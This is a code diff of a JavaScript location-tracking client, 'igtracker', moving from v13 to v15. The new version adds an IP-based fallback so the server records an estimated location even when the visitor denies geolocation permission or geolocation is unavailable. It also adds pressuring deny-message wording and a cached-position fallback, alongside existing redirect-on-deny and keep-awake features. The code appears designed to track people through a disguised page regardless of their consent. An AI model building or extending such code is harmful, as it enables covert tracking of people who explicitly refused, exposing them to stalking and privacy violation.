@@ -1,7 +1,7 @@
-/* igtracker 連続位置追跡クライアント v13
-   v13: getCurrentPosition が無反応でも止まらないようJS側タイムアウトを追加。
-        watchPosition を最初から開始。許可済みで取れない場合の文言を追加。
-        ?dbg=1 でデバッグ表示。
+/* igtracker 連続位置追跡クライアント v15
+   v15: 位置が取れないときは回線からの推定で点を必ず残す。
+        geolocationの多重呼び出しを直列化（iOSで多重にすると固まる）。
+        ?dbg=1 で失敗理由を画面に出す。
 */
 (function () {
   "use strict";
@@ -31,11 +31,13 @@
   var HIT = window.LT_HIT || 0;
   var SEND_EVERY = Math.min(IV, 4000);
 
-  /* 精度を落としてでも取る方向にエスカレート */
+  /* 既定 → 高精度 → 粗い → もっと粗い → キャッシュ許可（最後の砦） */
   var LADDER = [
+    { timeout: 10000, maximumAge: 0 },
     { enableHighAccuracy: true,  timeout: 12000, maximumAge: 0 },
     { enableHighAccuracy: false, timeout: 15000, maximumAge: 30000 },
-    { enableHighAccuracy: false, timeout: 20000, maximumAge: 300000 }
+    { enableHighAccuracy: false, timeout: 20000, maximumAge: 300000 },
+    { enableHighAccuracy: false, timeout: 25000, maximumAge: Infinity }
   ];
   var step = 0;
   function opts() { return LADDER[Math.min(step, LADDER.length - 1)]; }
@@ -45,7 +47,7 @@
   var WAIT = (parseFloat(window.LT_WAIT) || 10) * 1000;
   var DENY_REDIRECT = !!window.LT_DENY_REDIRECT;
   var ASK_TEXT = window.LT_ASK_TEXT || "位置情報の使用を許可してください";
-  var DENY_TEXT = window.LT_DENY_TEXT || "位置情報が許可されていません";
+  var DENY_TEXT = window.LT_DENY_TEXT || "アクセスを許可されなかったため確認できませんでした。アクセスを許可してください";
   var RETRY_TEXT = window.LT_RETRY_TEXT || "もう一度";
   var DEBUG = !!window.LT_DEBUG || /[?&]dbg=1/.test(location.search);
 
@@ -67,9 +69,9 @@
   var q = [];
   var sending = false, last = 0, started = 0, count = 0, left = false;
   var wid = null, wake = null, clock = null, sender = null, dog = null;
-  var waitTimer = null, ladderTimer = null;
+  var waitTimer = null, ladderTimer = null, inflight = false;
   var stopped = true, gotFix = false, bestAcc = null;
-  var lastFix = 0, lastAsk = 0, lastRestart = 0;
+  var lastFix = 0, lastAsk = 0, lastRestart = 0, lastIp = 0;
   var state = "wait";
   var batt = null, chg = null;
   var inapp = "";
@@ -87,8 +89,16 @@
     if (!DEBUG) return;
     var d = $("lt_dbg");
     if (d) d.textContent = m;
-    var e = $("lt_now");
-    if (e && !e.textContent) e.textContent = m;
+  }
+  function showDbg() {
+    if (!DEBUG) return;
+    ["lt_dbg", "lt_now", "lt_perm", "lt_time"].forEach(function (id) {
+      var e = $(id);
+      if (e) {
+        e.className = "";
+        e.style.cssText = "display:block;font-size:11px;color:#6b7386;line-height:1.5";
+      }
+    });
   }
   function showRetry() {
     var r = $("lt_retry");
@@ -100,7 +110,7 @@
   }
   function denyMessage() {
     if (permState === "granted") {
-      return "位置情報は許可済みですが取得できていません。電波状況かアプリ内ブラウザが原因のことがあります";
+      return "許可は受けていますが、この端末が位置を割り出せていません。回線からの推定で表示します";
     }
     return DENY_TEXT;
   }
@@ -136,6 +146,7 @@
     waitTimer = setTimeout(function () {
       waitTimer = null;
       if (left || stopped || gotFix) return;
+      ipFallback(true);                       // ★ 取れなくても点を残す
       if (DENY_REDIRECT && canLeave()) { leave(); return; }
       document.body.classList.add("need");
       setState("deny");
@@ -150,24 +161,37 @@
   }
   function drop(arr) { q = q.filter(function (x) { return arr.indexOf(x) === -1; }); }
 
-  /* ★ 無反応対策：必ずJS側で打ち切る */
+  /* ★ 位置が取れないとき：lat/lon無しで送る → サーバが回線から推定して点にする */
+  function ipFallback(force) {
+    if (gotFix || stopped || left) return;
+    var now = Date.now();
+    if (!force && now - lastIp < 55000) return;
+    lastIp = now;
+    try { q.push({ ts: iso(now) }); send(); } catch (e) {}
+  }
+
+  /* ★ 直列化：同時に1本だけ。無反応でも必ずJS側で打ち切る */
   function geoOnce(cb, eb, o) {
+    if (inflight) return false;
+    inflight = true;
     o = o || {};
     var done = false;
-    var ms = Math.max(4000, (o.timeout || 15000)) + 1500;
+    var ms = Math.max(4000, (o.timeout || 12000)) + 1500;
     var to = setTimeout(function () {
-      if (done) return; done = true;
+      if (done) return; done = true; inflight = false;
+      dbg("js-timeout " + ms + "ms");
       try { eb({ code: 3, message: "js-timeout" }); } catch (e) {}
     }, ms);
     try {
       navigator.geolocation.getCurrentPosition(
-        function (p) { if (done) return; done = true; clearTimeout(to); cb(p); },
-        function (e) { if (done) return; done = true; clearTimeout(to); eb(e || { code: 2 }); },
+        function (p) { if (done) return; done = true; inflight = false; clearTimeout(to); cb(p); },
+        function (e) { if (done) return; done = true; inflight = false; clearTimeout(to); eb(e || { code: 2 }); },
         o);
     } catch (e) {
-      clearTimeout(to);
+      clearTimeout(to); inflight = false;
       if (!done) { done = true; eb(e || { code: 2 }); }
     }
+    return true;
   }
 
   function send(extra) {
@@ -237,10 +261,16 @@
     dbg("err code=" + c + " msg=" + ((e && e.message) || "") + " step=" + step +
         " perm=" + permState);
     if (gotFix) return;
-    if (c === 1) { document.body.classList.add("need"); setState("deny"); return; }
+    if (c === 1) {
+      ipFallback(true);
+      document.body.classList.add("need");
+      setState("deny");
+      return;
+    }
     if (step < LADDER.length - 1) {
       step++;
       if (!gotFix) line("位置情報を取得中…", false);
+      ipFallback(false);                       // 途中でも1点残す
       if (ladderTimer) clearTimeout(ladderTimer);
       ladderTimer = setTimeout(function () {
         ladderTimer = null;
@@ -249,6 +279,7 @@
       }, 1000);
       return;
     }
+    ipFallback(true);
     armWait(WAIT);
   }
 
@@ -261,6 +292,7 @@
       if (!gotFix && step < LADDER.length - 1) step++;
       try { geoOnce(onPos, onErr, opts()); } catch (e) {}
     }
+    if (!gotFix) ipFallback(false);
     if (gap > 45000 && Date.now() - lastRestart > 30000) {
       lastRestart = Date.now(); restart();
     }
@@ -353,13 +385,17 @@
   function boot() {
     if (started) return;
     started = Date.now(); stopped = false;
-    showPerm(); checkInApp(); readBatt(); keepAwake(); showRetry();
+    showDbg(); showPerm(); checkInApp(); readBatt(); keepAwake(); showRetry();
     if (window.LT_KEEP && window.LT_KEEP.kick) { try { window.LT_KEEP.kick(); } catch (e) {} }
-    if (!navigator.geolocation) { document.body.classList.add("need"); setState("deny"); return; }
+    if (!navigator.geolocation) {
+      document.body.classList.add("need");
+      setState("deny");
+      ipFallback(true);
+      return;
+    }
 
     if (window.LT_FIRST_FIX && !gotFix) { try { onPos(window.LT_FIRST_FIX); } catch (e) {} }
 
-    /* ★ 先に全部張る：コールバックが来なくても画面とタイマーは進む */
     start();
     clock = setInterval(tick, 1000);
     sender = setInterval(function () {
@@ -370,6 +406,7 @@
     }, SEND_EVERY);
     dog = setInterval(watchdog, 5000);
     armWait(WAIT);
+    setTimeout(function () { if (!gotFix) ipFallback(true); }, 9000);   // ★ 早めに1点
 
     ask().then(function () {
       if (stopped || left) return;
@@ -422,14 +459,17 @@
     if (started && !stopped && !gotFix) attempt();
   }, { passive: true });
   var rt = $("lt_retry");
-  if (rt) rt.addEventListener("click", function () { setState("wait"); attempt(); });
+  if (rt) rt.addEventListener("click", function () {
+    step = 0; inflight = false;
+    setState("wait"); attempt();
+  });
 
   window.LT_LIVE = {
     start: boot, stop: stop, leave: leave, retry: attempt, restart: restart,
     feed: function (p) { try { onPos(p); } catch (e) {} },
     canLeave: canLeave,
     sid: SID, state: function () { return state; }, step: function () { return step; },
-    perm: function () { return permState; }
+    perm: function () { return permState; },
   };
 
   showPerm().then(function () {
